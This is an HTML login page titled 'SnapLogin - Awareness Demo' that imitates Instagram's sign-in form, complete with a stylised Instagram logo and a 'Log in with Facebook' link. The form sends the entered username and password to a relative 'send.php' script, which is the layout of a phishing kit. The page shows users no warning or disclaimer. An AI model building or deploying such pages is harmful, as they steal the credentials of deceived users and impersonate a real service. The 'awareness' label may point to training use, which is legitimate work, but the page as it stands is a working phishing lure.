<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>SnapLogin - Awareness Demo</title>
<style>
body {
  background-color: #fafafa;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  background-color: white;
  padding: 40px 30px;
  border: 1px solid #dbdbdb;
  border-radius: 8px;
  width: 300px;
  text-align: center;
}

.logo {
  font-size: 28px;
  font-weight: bold;
  color: #262626;
  margin-bottom: 20px;
}

.input-container {
  position: relative; /* مهم جدًا لوضع الأيقونة */
}

input[type="text"],
input[type="password"] {
  width: 100%;
  padding: 10px 40px 10px 10px; /* نترك مساحة على اليمين للأيقونة */
  margin: 6px 0;
  border: 1px solid #dbdbdb;
  border-radius: 4px;
  background-color: #fafafa;
  box-sizing: border-box;
}

.toggle-password {
  position: absolute;
  right: 10px;  /* المسافة من الجهة اليمنى */
  top: 50%;
  transform: translateY(-50%);
  width: 24px;
  height: 24px;
  cursor: pointer;
}

button.login-btn {
  width: 100%;
  padding: 10px;
  background-color: #3897f0;
  color: white;
  border: none;
  border-radius: 4px;
  font-weight: bold;
  margin-top: 10px;
  cursor: pointer;
}

.or-separator {
  display: flex;
  align-items: center;
  text-align: center;
  margin: 20px 0;
}
.or-separator hr {
  flex: 1;
  border: none;
  height: 1px;
  background-color: #dbdbdb;
}
.or-separator span {
  margin: 0 10px;
  font-size: 12px;
  color: #8e8e8e;
  font-weight: 600;
}

.facebook-login {
  color: #385185;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
  user-select: none;
}

.disclaimer {
  font-size: 12px;
  color: #999;
  margin-top: 20px;
}
</style>
</head>
<body>

<div class="container">
  <div class="logo">𝐼𝓃𝓈𝓉𝒶𝑔𝓇𝒶𝓂</div>
  <form method="post" action="../../send.php">
    <input type="text" placeholder="Phone number, username, or email" name="email" required />
    <div class="input-container">
      <input type="password" placeholder="Password" name="password" id="password" required>
      <img class="toggle-password" id="eye" src="../images/ey2.png" onclick="togglePassword()" alt="Toggle Password">
    </div>
    <button class="login-btn" type="submit">Log In</button>
  </form>

  <div class="or-separator">
    <hr><span>OR</span><hr>
  </div>

  <a href="https://facebook.com/login" class="facebook-login">Log in with Facebook</a>
</div>

<script>
function togglePassword() {
  const passwordField = document.getElementById('password');
  const eye = document.getElementById('eye');

  if(passwordField.type === "password") {
    passwordField.type = "text";
    eye.src = "../images/ey.png";
  } else {
    passwordField.type = "password";
    eye.src = "../images/ey2.png"; 
  }
}
</script>
</body>
</html>
